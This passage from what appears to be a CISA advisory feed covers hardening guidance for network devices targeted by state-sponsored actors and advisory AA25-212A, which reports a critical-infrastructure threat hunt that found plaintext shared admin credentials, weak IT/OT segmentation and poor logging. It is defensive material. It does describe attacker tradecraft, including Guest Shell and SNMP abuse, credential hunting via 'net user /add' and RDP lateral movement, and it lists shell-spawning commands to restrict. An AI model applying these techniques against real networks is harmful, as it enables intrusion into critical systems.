addresses prior to taking action, such as blocking.

However, cmd1 has the additional capability of collecting network packet captures on the compromised network. Note: The cmd3 and cmd1 clients were likely written by the same developer since they have similar build path strings and code structure.

See CISA’s Known Exploited Vulnerabilities Catalog for further information. Specifically, organizations should ensure edge devices are not vulnerable to known exploited CVEs identified in this advisory. Note: This advisory uses MITRE D3FEND™ , version 1.2.0, cybersecurity countermeasures. See the Appendix C: MITRE D3FEND Countermeasures section of this advisory for a table of the mitigations mapped to MITRE D3FEND countermeasures. General recommendations Regularly review network device (especially router) logs and configurations for evidence of any unexpected, unapproved, or unusual activity, especially for the activities listed in this advisory [ D3-PM ]. In particular, check for: Unexpected GRE or other tunneling protocols, especially with foreign infrastructure [ D3-NTCD ]. Unexpected external IPs set as a TACACS+ or RADIUS server, or other AAA service configuration modifications. Unexpected external IPs in ACLs. Unexpected packet capture or network traffic mirroring settings. Unexpected virtual containers running on network devices, or, where virtual containers are expected, unexpected commands within the containers. Employ a robust change management process that includes periodic auditing of device configurations [ D3-PM ]. Ensure all networking configurations are stored, tracked, and regularly audited via a change management process. A change management process audits approved configurations against what is currently running in an organization’s infrastructure. Review firewall rule creation and modification dates, cross referencing against change management approvals, to detect unauthorized rules or rule changes. Create alarms or alerts for unusual router administration access, commands, or other activity. Attempt to identify the full scope of a suspected compromise before mitigating. While it is important to contain the intrusion and prevent further malicious activity, if the full scope is not identified and mitigated fully, the actors may retain access and cause further malicious activity. Threat hunting and incident response efforts should be balanced against the total potential malicious activity with the goals of full eviction and minimizing damage. An established compromise by these APT actors will likely include recurring, large-scale exfiltration from the compromised network. In at least one instance, the APT actors utilized GRE and MPLS tunnels to move data back to China. Disable outbound connections from management interfaces to limit possible lateral movement activity between network devices [ D3-OTF ]. Disable all unused ports and protocols (both traffic and management protocols) [ D3-ACH ]. Only use encrypted and authenticated management protocols (e.g., SSH, SFTP/SCP, HTTPS) and disable all others, especially unencrypted protocols (e.g., Telnet, FTP, HTTP). Change all default administrative credentials, especially for network appliances and other network devices [ D3-CFP ]. Require public-key authentication for administrative roles. Disable password authentication where operationally feasible. Minimize authentication attempts and lockout windows to slow brute force and sprayed attempts [ D3-CH ]. Use the vendor recommended version of the network device operating system and keep it updated with all patches. Upgrade unsupported network devices to ones that are supported by the vendor with security updates [ D3-SU ]. Hardening management protocols and services Implement management-plane isolation and control-plane policing (CoPP) [ D3-NI ]. Place all device management services (SSH, HTTPS, SNMP, TACACS+/RADIUS, SCP/SFTP) strictly in a dedicated out-of-band management network or a management VRF. Ensure this management VRF has no route leakage to customers or peering VRFs and cannot initiate or receive sessions from data-plane or peering address space [ D3-ITF ]. Block all egress from the management VRF except to explicitly authorized AAA/syslog/NetFlow/IPFIX/telemetry collectors to prevent actor use of management interfaces as lateral movement conduits or exfiltration paths. Apply explicit management-plane ACLs at the control plane (e.g., CoPP/CPPr) to allowlist (i.e., default-deny) and rate-limit management protocols. Allow only approved management station IPs/subnets and jump servers. Apply these restrictions to all SNMP, TACACS+/RADIUS (TCP/UDP 49/1812/1813), HTTPS (TCP/443 and any configured non-default port), SSH (TCP/22 and any configured non-default port), and SFTP/SCP. For devices that do not support ACLs, place on a separate management Virtual Local Area Network (VLAN); an ACL can be applied to this management VLAN from an upstream device, such as a router or Layer 3 switch. Use SSHv2 only and disable Telnet. Audit and restrict SSH on non-default ports (e.g., 22x22 and xxx22 patterns) commonly used by the APT actors. If a web interface is operationally required, bind it only to the management VRF/interface. Use HTTPS only and disable unencrypted HTTP. Require AAA for web interface access. Monitor and alert on non-default high HTTPS ports (e.g., 18xxx) observed in intrusions. Use SNMPv3 only, and disable SNMPv1 and SNMPv2. Configure Trusted Managers and ACLs to limit SNMP access to only trusted devices. Change all weak and default SNMP community strings. Restrict and monitor SNMP writes. Enforce SNMPv3 with authPriv and apply VACM views that exclude configuration-altering MIB objects from write access. Only grant read access for required OIDs; reserve write access for tightly scoped automation accounts from approved managers. Continuously monitor SNMP SET operations and alert on changes to AAA servers, HTTP/HTTPS enablement or port changes, tunnel interfaces, SPAN/ERSPAN sessions, and routing and ACL objects. Actor tradecraft includes issuing SNMP SETs to make covert configuration changes at scale. Configure only strong cryptographic cipher suites for all management protocols (e.g., SSH, SFTP, HTTPS) and reject all weak ones. Enforce per-protocol rate limits (particularly for SSH, HTTPS, SNMP, TACACS+/RADIUS) to blunt credential-guessing and slow “low-and-slow" abuse of built-in functions (e.g., Embedded Packet Capture, tunnel setup) without denying legitimate admin access. Eliminate unintended IPv6 management exposure. If IPv6 is enabled, apply equivalent controls for IPv6 as for IPv4. Enforce management-plane ACLs and CoPP for IPv6. Bind management services only to the management VRF/interface in IPv6. Audit for IPv6-reachable management services and tunnels, as the APT actors’ infrastructure includes IPv6 addresses.&nbsp; Implementing robust logging Ensure logging is enabled and forwarded to a centralized server. Set the trap and buffer logging levels on each device to at least syslog level “informational” (code 6) to collect all necessary information. Ensure all logs sent to a centralized logging server are transmitted via a secure, authenticated, and encrypted channel (such as IPsec, TLS, or SSH tunnels). The central server should maintain immutable logs with retention periods sufficient to support cybersecurity incident response investigations and comply with applicable retention policies. Enable AAA command accounting for privileged commands to record any attempts to invoke those commands. Routing best practices Utilize routing authentication mechanisms, when possible. Protect peering and edge routing paths often abused for covert redirection. Continuously validate static routes, policy-based routing (PBR), and VRF-leak policies at peering edges. Alert on additions that steer traffic toward non-standard GRE/IPsec endpoints or unexpected next hops. Enforce maximum-prefix limits, strict prefix/AS-path filtering, and “only-expected” communities on all external BGP (eBGP) sessions. Deny default and overly broad routes. Enable TTL security (GTSM) or equivalent for eBGP to reduce off-path attack surface. Require session protection (TCP-AO where supported, otherwise MD5) and monitor for BGP session resets and parameter changes from unexpected management origins. Virtual Private Network (VPN) best practices Delete default VPN Internet Key Exchange (IKE) policies and associated components. Create IKE policies consistent with applicable requirements and guidance on cryptographic algorithm use. For U.S. National Security Systems, follow Committee on National Security Systems Policy (CNSSP) 15 and other applicable policies: Diffie-Hellman Group: 16 with 4096 bit Modular Exponential (MODP) Diffie-Hellman Group: 20 with 384 bit Elliptic Curve Group (ECP) Encryption: AES-256 Hashing: SHA-384&nbsp; Cisco-specific recommendations Disable the Cisco Smart Install feature. Store credentials using strong cryptography. Protect local credentials on Cisco networking devices using Type 8 (PBKDF2-SHA-256) where supported. Do not use Type 7 and transition from Type 5 (MD5) when possible. Use Type 6 (AES) key encryption to protect stored secrets (e.g., TACACS+/RADIUS shared secrets or IKE PSKs). Disable outbound connections from the VTYs (e.g., transport output none ). This prevents initiating SSH, Telnet, or other client sessions from the device via VTY, reducing its utility as a jump host. Monitor for any changes to this setting. Audit for unexpected enablement of IOS XR host SSH ( sshd_operns ) on TCP/57722. This is disabled by default, but has been observed being enabled by actors for persistence. When not required, disable the web configuration interface on applicable Cisco networking devices by running no ip http server and no ip http secure-server . If management via a web interface is required, ensure to enable only the HTTPS management interface by running the command ip http secure-server and keep no ip http server configured to prevent unencrypted access via HTTP. Ensure a final deny any any log line is added to all configured ACLs. This ensures that the denied connections are logged so they could be reviewed at a later date. Mitigating Guest Shell abuse Disable Guest Shell where not operationally required. For IOS XE, run guestshell disable to stop the container. Where supported, disable the IOx subsystem with no iox to prevent container hosting entirely. Confirm with show guestshell / show iox . For NX-OS, run guestshell disable to stop the container. Use guestshell destroy to uninstall it and return resources to the system. Confirm with show guestshell . Where Guest Shell is disabled, restrict (re)enabling Guest Shell. Enforce AAA command authorization (TACACS+/RADIUS) so only approved roles can run guestshell enable , guestshell run bash (IOS XE), run guestshell (NX-OS), guestshell disable/destroy , chvrf , dohost , or IOx-related commands. Where Guest Shell is used: Forward container logs (e.g., journald/systemd inside Guest Shell) to your SIEM. Device syslog does not capture process activity inside the container by default. Configure the VRF used by Guest Shell (management VRF on IOS XE; default VRF on NX-OS unless chvrf is used). Restrict egress to only required destinations (e.g., SIEM/AAA/telemetry collectors) with ACLs. Perform periodic inventories and integrity checks of device storage (e.g., bootflash: ) to detect unexpected files created from the container. Create alerts for guestshell disable / guestshell destroy and unexpected chvrf / dohost usage. Consider Cisco Embedded Event Manager (EEM) policies that snapshot state (running processes, container filesystem, storage listings) when these events occur.

**Published:** Tue, 29 Jul 2025 13:53:52 EDT  
**Source:** CISA Cybersecurity Advisories

**Summary:** Summary The Cybersecurity and Infrastructure Security Agency (CISA) and U.S. Coast Guard (USCG) are issuing this Cybersecurity Advisory to present findings from a recent CISA and USCG hunt engagement. The purpose of this advisory is to highlight identified cybersecurity issues, thereby informing security defenders in other organizations of potential similar issues and encouraging them to take proactive measures to enhance their cybersecurity posture. This advisory has been coordinated with the organization involved in the hunt engagement. CISA led a proactive hunt engagement at a U.S. critical infrastructure organization with the support of USCG analysts. During hunts, CISA proactively searches for evidence of malicious activity or malicious cyber actor presence on customer networks. The organization invited CISA to conduct a proactive hunt to determine if an actor had been present in the organization’s environment. ( Note: Henceforth, unless otherwise defined, “CISA” is used in this advisory to refer to the hunt team as an umbrella for both CISA and USCG analysts). During this engagement, CISA did not identify evidence of malicious cyber activity or actor presence on the organization’s network, but did identify cybersecurity risks, including: Insufficient logging; Insecurely stored credentials; Shared local administrator (admin) credentials across many workstations; Unrestricted remote access for local admin accounts; Insufficient network segmentation configuration between IT and operational technology (OT) assets; and Several device misconfigurations. In coordination with the organization where the hunt was conducted, CISA and USCG are sharing cybersecurity risk findings and associated mitigations to assist other critical infrastructure organizations with improving their cybersecurity posture. Recommendations are listed for each of CISA’s findings, as well as general practices to strengthen cybersecurity for OT environments. These mitigations align with CISA and the National Institute for Standards and Technology’s (NIST) Cross-Sector Cybersecurity Performance Goals (CPGs) , and with mitigations provided in the USCG Cyber Command’s (CGCYBER) 2024 Cyber Trends and Insights in the Marine Environment (CTIME) Report . Although no malicious activity was identified during this engagement, critical infrastructure organizations are advised to review and implement the mitigations listed in this advisory to prevent potential compromises and better protect our national infrastructure. These mitigations include the following (listed in order of importance): Do not store passwords or credentials in plaintext.&nbsp; Instead, use secure password and credential management solutions&nbsp; such as encrypted password vaults, managed service accounts, or built-in secure features of deployment tools. Ensure that all credentials are encrypted&nbsp; both at rest and in transit. Implement strict access controls and regular audits&nbsp; to securely manage scripts or tools accessing credentials. Use code reviews and automated scanning tools to detect and eliminate any instances of plaintext credentials on hosts or workstations. Enforce the principle of least privilege , only granting users and processes the access necessary to perform their functions. Avoid sharing local administrator account credentials.&nbsp; Instead, provision unique, complex passwords for each account&nbsp; using tools like Microsoft’s Local Administrator Password Solution (LAPS) that automate password management and rotation. Enforce multifactor authentication (MFA) for all administrative access , including local and domain accounts, and for remote access methods such as Remote Desktop Protocol (RDP) and virtual private network (VPN) connections. Implement and enforce strict policies to only use hardened bastion hosts isolated from IT networks equipped with phishing-resistant MFA to access industrial control systems (ICS)/OT networks , and ensure regular workstations (i.e., workstations used for accessing IT networks and applications) cannot be used to access ICS/OT networks. Implement comprehensive (i.e., large coverage) and detailed logging across all systems , including workstations, servers, network devices, and security appliances. Ensure logs capture information such as authentication attempts, command-line executions with arguments, and network connections . Retain logs for an appropriate period to enable thorough historical analysis (adhering to organizational policies and compliance requirements) and aggregate logs in an out-of-band, centralized location , such as a security information event management (SIEM) tool, to protect them from tampering and facilitate efficient analysis. For more detailed mitigations addressing the identified cybersecurity risks, see the&nbsp; Mitigations&nbsp; section of this advisory. Download the PDF version of this report: AA25-212A CISA and USCG Identify Areas for Cyber Hygiene Improvement (PDF, 537.67 KB ) Technical Details Note: This advisory uses the MITRE ATT&amp;CK ® Matrix for Enterprise framework, version 17. See Appendix: MITRE ATT&amp;CK Tactics and Techniques for a table of potential activity mapped to MITRE ATT&amp;CK tactics and techniques. Overview Cybersecurity and Infrastructure Security Agency (CISA) and United States Coast Guard (USCG) analysts (collectively referred to as CISA in this report) conducted a threat hunt engagement at a critical infrastructure organization. During this hunt, CISA proactively searched for evidence of malicious activity or the presence of a malicious cyber actor on the customer’s network using host, network, industrial control system (ICS), and commercial cloud and open-source analysis tools. CISA searched for evidence of activity by looking for specific exploitation tactics, techniques, and procedures (TTPs) and associated artifacts. While CISA did not find evidence of threat actor presence on the organization’s network, the team did identify several cybersecurity risks. These findings are listed below in order of risk. Technical details of each identified cyber risk are included, along with the potential impact from threat actor exploitation of each risk (recommendations for mitigating each risk are listed in the Mitigations &nbsp; section below). Several of these findings align with those observed during similar engagements conducted by US Coast Guard Cyber Command (CGCYBER), which are documented in their 2024 Cyber Trends and Insights in the Marine Environment (CTIME) report. The authoring agencies encourage critical infrastructure organizations to review the CTIME report to understand trends in the techniques/attack paths threat actors are using to compromise at-risk organizations, and what mitigations organizations should implement to prevent a successful attack. Key Findings Shared Local Admin Accounts with Non-Unique Passwords Stored as Plaintext Details:&nbsp; CISA identified a few local admin accounts with non-unique passwords; these accounts were shared across many hosts. The credentials for each account were stored plaintext in batch scripts. CISA discovered these authorized scripts were configured to create user accounts with local admin privileges and then set identical, non-expiring passwords—these passwords were stored in plaintext in the script. One script was configured to create an admin account (set with a password stored in the script in plaintext) and automatically add to the admin group. The account was set as the local admin account on many other hosts. Potential Impact:&nbsp; The storage of local admin credentials in plaintext scripts across numerous hosts increases the risk of widespread unauthorized access, and the usage of non-unique passwords facilitates lateral movement throughout the network. Malicious actors with access to workstations with either of these batch scripts could obtain the passwords for these local admin accounts by searching the filesystem for strings like net user /add , identifying scripts containing usernames and passwords [ T1552.001 ], and accessing these accounts to move laterally. For example, during a controlled security validation exercise (with explicit permission from the customer), CISA used the credentials found in one of the scripts to log into its associated admin account locally on a workstation [ T1078.003 ], and then establish a Remote Desktop Protocol (RDP) connection to another workstation [ T1021.001 ]. This demonstrated that the credentials allowed local login to an admin account and enabled lateral movement to any workstation with the account. While using this account, the user had local admin privileges on many workstations. Upon initiating the RDP session, the system issued out a notification that another user was currently logged in and that continuing the session would disconnect the existing user, confirming that the account can be accessed remotely via RDP. The uniform use of local admin accounts with identical, non-expiring passwords across numerous hosts, coupled with the storage of these credentials in plaintext within accessible scripts, elevates the risk of unauthorized access and lateral movement throughout the network. With local admin access, malicious cyber actors can: Modify existing accounts or create new accounts [ T1098 ], potentially escalating privileges or maintaining persistent access. Install malicious browser extensions on compromised systems [ T1112 ]. Communicate with compromised systems using standard application layer protocols [ T1071 ], which may bypass certain security monitoring tools. Modify local policies to escalate privileges or disable security features [ T1484 ]. Alter system configurations or install software that executes at startup [ T1547 ], ensuring continued access and persistence. Hijack the execution flow of applications to inject malicious code [ T1574 ]. The widespread distribution of plaintext credentials and the use of identical passwords across hosts increases the risk of unauthorized access throughout the network. This vulnerability heightens the potential for attackers to conduct unauthorized activities, which may impact the confidentiality, integrity, and availability of the organization’s assets. Note: This finding was associated with workstations only; servers and other devices were not affected. Insufficient Network Segmentation Configuration Between IT and Operational Technology Environments Details: While assessing interconnectivity between the customer’s IT and operational technology (OT) environments, CISA identified that the OT environment was not properly configured. Specifically, standard user accounts could directly access the supervisory control and data acquisition (SCADA) virtual local area network (VLAN) directly from IT hosts. First, CISA determined it was possible to establish a connection via port 21 from a user workstation in the IT network to a system within the SCADA VLAN. The test established that a network path was available, the remote host was reachable, the port was open and listening for connections, and that the port was directly accessible between the IT and SCADA VLANs, with misconfigured network-level restrictions—for example, firewalls or access control lists (ACLs)—blocking the Transmission Control Protocol (TCP) connection on the port. This test was conducted using a standard user account on a regular IT workstation without administrative privileges [ T1078 ]. Second, CISA discovered that the customer did not have sufficient secured bastion hosts dedicated for accessing SCADA and heating, ventilation, and air conditioning (HVAC) systems. A bastion host­—sometimes referred to as a jump box or jump server—is a specialized, highly secured system (often a server or dedicated workstation) that serves as the sole access point between a network segment (such as an internal IT network) and a protected internal network (like an OT or ICS environment). By inspecting and filtering all inbound and outbound traffic, a bastion host is designed to prevent unauthorized access and lateral movement, ensuring that only authenticated and authorized users can interact with internal systems. Though several hosts were designated as bastion hosts for remote access to SCADA and HVAC systems, they lacked the enhanced security configuration, dedicated monitoring, and specialized scrutiny expected of bastion hosts. Potential&nbsp;Impact:&nbsp; Insufficient OT network segmentation configuration, network access control (NAC), and the ability of a non-privileged user within the IT network to use their credentials to access the critical SCADA VLAN [ T1078 ] presents a security and safety risk. Given that SCADA and HVAC systems control physical processes, compromises of these systems can have real-world consequences, including risks to personnel safety, infrastructure integrity, and equipment functionality. Malicious actors could further exploit potentially unsecured workstations with access to OT systems, and insufficient network segmentation configuration between IT and OT systems, in the following ways: Use RDP or Secure Shell (SSH) protocols to move laterally from compromised IT workstations to OT systems [ T1021.001 ] [ T1021.004 ]. Execute commands and scripts using scripting languages like PowerShell to attack OT systems [ T1059 ]. Map network connections to identify paths to OT systems [ T1049 ]. Gather information about network configurations to plan attacks on OT systems [ T1016 ]. By exploiting these weaknesses, attackers can potentially gain unauthorized access to critical OT systems, manipulate physical processes, disrupt operations, and cause harm. Insufficient Log Retention and Implementation Details: CISA was unable to hunt for every MITRE ATT&amp;CK ® procedure in the scoped hunt plan partly because the organization’s event logging system was insufficient for this analysis. For example, Windows event logs from workstations were not being forwarded to the organization’s security information event management (SIEM), verbose command line auditing was not enabled (meaning command line arguments were not being captured in Event ID 4688 ), logging in the SIEM was not as comprehensive as required for the analysis, and log retention did not allow for a thorough analysis of historical activity. Potential Impact:&nbsp; The absence of comprehensive and detailed logs, along with a lack of an established baseline for normal network behavior, prevented CISA from performing thorough behavior and anomaly-based detection. This limitation hindered the ability to hunt for certain TTPs, such as living-off-the-land techniques, the use of valid accounts [ T1078 ], and other TTPs used by sophisticated threat actors. Such techniques often do not produce discrete indicators of compromise or trigger alerts from antivirus software, intrusion detection systems (IDS), or endpoint detection and response (EDR) solutions. Further, the lack of workstation logs in the organization’s SIEM meant CISA could not analyze authentication events to identify anomalous activities, such as unauthorized access using local administrator credentials. This gap exposes networks to undetected lateral movement and unauthorized access. Insufficient logging can prevent the detection of malicious activity by hindering investigations, which makes detection of threat actors more challenging and leaves the network susceptible to undetected threats. Additional Findings Misconfigured sslFlags on a Production Server Details: CISA used PowerShell to examine the ApplicationHost.config file [ 1 ] —a central configuration file for Internet Information Services (IIS) that governs the behavior of the web server and its applications and websites—on a production IIS server. CISA observed an HTTPS binding configured with sslFlags==“0” , which keeps IIS in its legacy “one-certificate-per-IP” mode. This mode disables modern certificate-management features, and because mutual Transport Layer Security (TLS) (client-certificate authentication) must be enabled separately in “SSL Settings” or by adding &lt;access sslFlags=“Ssl, SslRequireCert” /&gt; , the binding leaves the client-certificate enforcement off by default, allowing any TLS client to complete the handshake anonymously. Moreover, sslFlags &nbsp;does not control protocol or cipher selection, so outdated protocols or weak cipher suites (e.g., SSL 3.0, TLS 1.0/1.1) may still be accepted unless Secure Channel (Schannel) [ 2 ] has been explicitly hardened. Potential Impact:&nbsp; The misconfigured sslFlags could enable threat actors to attempt an adversary-in-the-middle attack [ T1557 ] to intercept credentials and data transmitted between clients and the IIS server. Malicious actors could also exploit vulnerabilities in older Secure Sockets Layer (SSL)/TLS protocols, as well as weak cipher suites, increasing the risk for protocol downgrade attacks in which an attacker forces the server and client to negotiate the use of weaker encryption standards [ T1562.010 ]. This compromises the confidentiality and integrity of data transmitted over this channel. Furthermore, the absence of client certificate enforcement meant the server did not validate the identity of the connecting clients beyond the basic SSL/TLS handshake. This deficiency exposed the server to risks where unauthorized or malicious clients could impersonate legitimate users, potentially gaining access to sensitive resources without proper verification. Misconfigured Structured Query Language Connections on a Production Server Details:&nbsp; CISA reviewed machine.config file on a production server and identified that it was configured with a centralized database connection string, LocalSqlServer , for both profile and role providers. This configuration implies that, unless overridden in each application’s web.config files, every ASP.NET site on the server connects to the same Structured Query Language (SQL) Express or aspnetdb database and shares the same credentials context. Additionally, CISA identified that the machine.config file set the minRequiredPasswordLength to be less than 15 characters, which is CISA’s recommended password length . Potential Impact: Using a centralized database approach&nbsp; increases risk, as a single breach or misconfiguration in this central SQL database server can compromise all&nbsp; applications dependent on the server. This creates a single point of failure and could be exploited by attackers aiming to gain broad access to the system. Additionally, setting the minimum password length to any password under 15 characters is more vulnerable to various forms of brute-force attacks, such as password guessing [ T1110.001 ], cracking [ T1110.002 ], spraying [ T1110.003 ], and credential stuffing [ T1110.004 ]. If a threat actor successfully cracked these weak passwords, they could gain unauthorized access to user or application accounts and leverage vulnerabilities within applications to further escalate privileges, potentially leading to unauthorized access to the backend SQL Server databases. This could result in data breaches, data manipulation, or a loss of database integrity. Mitigations CISA and USCG recommend that critical infrastructure organizations implement the mitigations below to improve their organization’s cybersecurity posture. Recommendations to reduce cyber risk are listed for each of CISA’s findings during this engagement and are ordered starting from the highest to lowest importance for organizations to implement. CISA and USCG also include general practices to strengthen cybersecurity for OT environments that are not tied to specific findings. These mitigations align with the Cross-Sector Cybersecurity Performance Goals jointly developed by CISA and the National Institute for Standards and Technology (NIST). The Cybersecurity Performance Goals (CPGs) provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful TTPs. Visit CISA’s CPGs webpage for more information. Many of these mitigations also align with recommendations made by CGCYBER in their 2024 CTIME report . The report provides relevant information and lessons learned about cybersecurity risks gathered through operations similar to this threat hunt engagement, and best practices to mitigate these risks. Please see the 2024 CTIME report for additional recommendations for critical infrastructure organizations to implement to harden their environments against malicious activity. Implement Unique Credentials and Access Control Measures for Administrator Accounts Provision unique and complex credentials for local administrator accounts&nbsp; [ CPG 2.C ] on all systems. Do not use shared or identical administrative credentials across systems. &nbsp; Ensure service accounts/machine accounts have passwords unique from all member user accounts. For example, organizations can deploy Microsoft LAPS (see Microsoft Learn’s&nbsp; Windows LAPS Overview for more information) to ensure each machine has a unique, complex local administrator password; passwords are rotated automatically within Microsoft Active Directory, reducing the window of vulnerability; and that password retrieval is limited to authorized personnel only. Require&nbsp; phishing-resistant multifactor authentication (MFA) [ CPG 2.H ] in addition to unique passwords for all administrative access, including local- and domain-level administrator accounts,&nbsp; RDP sessions, and VPN&nbsp;connections. Use privileged access workstations (PAWs) dedicated solely for administrative tasks&nbsp; and isolate them from the internet and general network to reduce exposure to threats and lateral movement. Harden PAWs by applying CIS Benchmarks : limit software to essential administrative functions, disable unnecessary services and ports, and ensure regular updates and patches. Enforce strict access controls to restrict PAW access to authorized administrators only. Conduct continuous auditing of privileged accounts&nbsp; by regularly collecting and analyzing logs of administrative activities, such as login attempts, command executions, and configuration changes [ CPG 2.T ]. Configure automated alerts for anomalous behaviors, including logins outside standard hours, access from unauthorized locations, and repeated failed logins. Periodically review all administrator accounts to confirm the necessity and appropriateness of access levels; align these auditing practices with NIST SP 800-53 Rev. 5 Controls AU-2 (Auditable Events) and AU-12 (Audit Record Generation). Apply the principle of least privilege&nbsp; by limiting administrative privileges to the minimum required for users to perform their roles [ CPG 2.E ]. Create individual administrative accounts with unique credentials and role-specific permissions and disable or rename built-in local administrator accounts to reduce common attack vectors. Avoid using shared administrator accounts to improve accountability and auditability, and ensure administrators use standard accounts for non-administrative tasks to minimize credential exposure. Implement Role-Based Access Control (RBAC) to assign permissions based on job functions, as aligned with NIST SP 800-53 Rev. 5 Control AC-5 (Separation of Duties). Identify and remove unauthorized or unnecessary local administrator accounts , maintain oversight by documenting and tracking all authorized accounts, and enforce strict account management policies by restricting account creation privileges and implementing approval workflows for new administrator accounts. Securely Store and Manage Credentials Purge credentials from the System Center Configuration Manager (SCCM) . Review SCCM packages, task sequences, and scripts to ensure that no plaintext credentials are embedded, and update or remove any configurations that deploy scripts with plaintext credentials. Do not store plaintext credentials in scripts . Instead, store credentials in a secure manner,&nbsp; such as with a credential/password manager or vault, or other privileged account management solution [ CPG 2.L ]. Leverage SCCM’s built-in capabilities to run tasks with administrative privileges without exposing credentials (for further guidance, refer to Microsoft’s best practices for secure SCCM configuration ). Use encrypted communication . If scripts must retrieve credentials at runtime, use encrypted channels and protocols (e.g., TLS 1.3) to communicate with secure credential stores. Ensure that credentials are not written to disk or exposed in logs. Use unique local administrator passwords , &nbsp; such as by deploying Microsoft LAPS. Set appropriate permissions on Active Directory attributes used by LAPS ( ms-MCS-AdmPwd and ms-MCS-AdmPwdExpirationTime ) per Microsoft’s security recommendations. Establish Network Segmentation Between IT and OT Environments Assess the existing network architecture to ensure effective segmentation between the IT and OT networks [ CPG 2.F ]—this process should evaluate both logical and physical segmentation, ensuring clear boundaries between IT and OT assets. Use NIST SP 800-82 Rev. 3 (Guide to OT Security) and International Electrotechnical Commission (IEC) 62443 standards as guides for network segmentation best practices. Network segmentation is essential for containing breaches within isolated segments and preventing them from spreading across networks. Depending on your environment, consider implementing the following segmentation: Implement VLAN segmentation with inter-VLAN access controls. Create separate VLANs for IT and OT systems, specifically isolating OT components such as SCADA systems from IT network VLANs. Configure inter-VLAN access controls, including Layer 3 ACLs, to restrict traffic between IT and SCADA VLANs. Deploy firewalls with application-layer filtering capabilities to monitor and control data flow between the VLANs, ensuring that only authorized protocols and devices can communicate across segments. Implement a demilitarized zone (DMZ) between IT and OT environments to provide an additional security layer. Position firewalls at both the IT-DMZ and OT-DMZ boundaries to filter traffic and enforce strict communication policies. Configure the DMZ to act as an intermediary, with only essential communications permitted between IT and OT networks. Ensure the DMZ hosts shared services (e.g., bastion hosts, jump servers, or data historians) that require limited interaction with both environments, with access controls and monitoring in place. Consider a full network re-architecture if current segmentation methods cannot effectively separate IT and OT networks. Collaborate with cybersecurity and network experts to design an architecture that meets ICS-specific security requirements—this redesign may involve transitioning to a micro-segmented or zero trust architecture, which includes strict identity verification for all users and devices attempting to access OT assets. [ 3 ] Implement unidirectional gateways (data diodes)&nbsp; where appropriate to prevent bidirectional communication. Keep network diagrams, configuration files, and asset inventories up to date. Regularly test segmentation controls to validate their effectiveness in restricting unauthorized access by conducting penetration testing and security assessments. Include simulated breach scenarios to confirm that segmentation contains threats within isolated zones. Ensure compliance with NIST SP 800-53 Rev. 5 Control AC-4 (Information Flow Enforcement) to align segmentation measures with best practices for controlled information flow. Prevent Unauthorized Access via Port 21 Disable File Transfer Protocol (FTP) services on SCADA devices and servers if they are not required.&nbsp; Replace FTP with secure alternatives, such as SSH FTP (SFTP) or FTP over TLS/SSL (FTPS). Block inbound and outbound FTP traffic on port&nbsp; 21 using firewalls and ACLs. Implement restrictive ACL policies at network boundaries to control FTP access across all network layers. As outlined in CIS Control 9.2 (Limit Unnecessary Ports, Protocols, and Services), close any unused ports to strengthen network defenses. Implement IDS/Intrusion Prevention System (IPS) technologies to monitor traffic between the IT network and SCADA VLAN , use signature and anomaly detection, and integrate IDS/IPS with a SIEM system for centralized monitoring. Enhance authentication and encryption mechanisms.&nbsp; Require MFA for SCADA access, use secure remote access technologies when necessary, securely encrypt communications (using protocols such as TLS 1.2 or higher, preferably TLS 1.3), and establish VPN tunnels to communicate between IT networks and SCADA systems. Perform network traffic filtering and deep packet inspection. Use SCADA-aware firewalls capable of understanding SCADA protocols and inspecting and filtering traffic at the application layer. Only allowlist authorized protocols and command structures to SCADA operations. Use one-way communication devices to prevent data from flowing back into the SCADA network. Establish Secure Bastion Hosts for OT Network Access Ensure bastion hosts are dedicated secure access points&nbsp; exclusively used to access the OT network and deployed as exclusive management gateways for all devices within a network . Make bastion hosts the single access points for conducting all administrative tasks, system management, and configuration changes; this centralizes access control and ensures any interaction with the OT system passes through a rigorously monitored and secure environment, minimizing the potential for unauthorized access. Do not allow staff to use bastion hosts as regular workstations . Provide staff with separate workstations for accessing email, internet browsing, etc., on the IT network. Establish and enforce policies that prohibit non-administrative activities on bastion hosts, ensuring they remain dedicated to OT network access. Regularly audit and monitor bastion hosts&nbsp; to maintain security integrity, prevent unauthorized use, and quickly address any vulnerabilities or policy non-compliance. Configure comprehensive logging of all activities on bastion hosts,&nbsp; including authentication attempts, command executions, configuration changes, and file transfers. Aggregate logs into a SIEM. Isolate bastion hosts from the IT network ; bastion hosts should reside in a separate security zone with restricted communication pathways &nbsp; (see CISA’s infographic on Layering Network Security Through Segmentation ). Deploy bastion hosts in a DMZ, imposing physical and logical isolation from other networks. Configure firewalls between the IT network, bastion hosts, and the OT network, enforcing strict access control policies to allow only necessary traffic. Ensure secure configuration and hardening of bastion hosts:&nbsp; Comply with NIST SP 800-123 and CIS Benchmarks and CNSSI 4009-2015 , remove nonessential applications and services to reduce the attack surface, configure system settings to be secure, conduct effective patch management, enforce the principle of least functionality, and disable unused ports and protocols. Implement access control policies: remove any access permissions to the OT network from IT workstations and ensure only bastion hosts have access to the OT network. Implement NAC solutions to enforce policy-driven access control decisions based on device compliance and user authentication to provide dynamic access control and real-time visibility into the devices on the network. Equip each bastion host with robust authentication mechanisms,&nbsp; including &nbsp; phishing resistant MFA&nbsp;[ CPG 2.H ], to verify the identity of users accessing the network. Align with AAL3 as defined in NIST SP 800-63B . AAL3 requires hardware-based authenticators and proof of possession of cryptographic keys through secure authentication protocols. Implement stringent access controls that restrict access to authorized personnel only using RBAC principles , ensuring that personnel can only access information and perform tasks pertinent to their roles and duties. This reduces the risk of internal threats or lateral movement and prevents unauthorized access. Securely configure remote access tools,&nbsp; including by using secure protocols and disabling remote access tools on IT workstations to the OT network, enforcing that all remote access occurs through bastion hosts. Disable insecure protocols like Telnet and unencrypted VNC to prevent interception and unauthorized access. Log all remote access sessions and monitor for unauthorized or anomalous activities. Implement Comprehensive Logging, Log Retention, and Analysis Implement comprehensive and verbose (i.e., detailed) logging across all systems,&nbsp; including workstations, servers, network devices, and security appliances [ CPG 2.T ]. Enable logging of critical events such as authentication attempts, command-line executions with command arguments (Event ID 4688 ), and network connections. Aggregate logs in an out-of-band, centralized location [ CPG 2.U ] where adversaries cannot tamper with them, such as a dedicated SIEM, in order to facilitate behavior analytics, anomaly detection, and proactive threat hunting [ CPG 2.T , 2.U ]. For more information on behavior- and anomaly-based detection techniques, see joint guidance Identifying and Mitigating Living off the Land . Ensure comprehensive logging on bastion 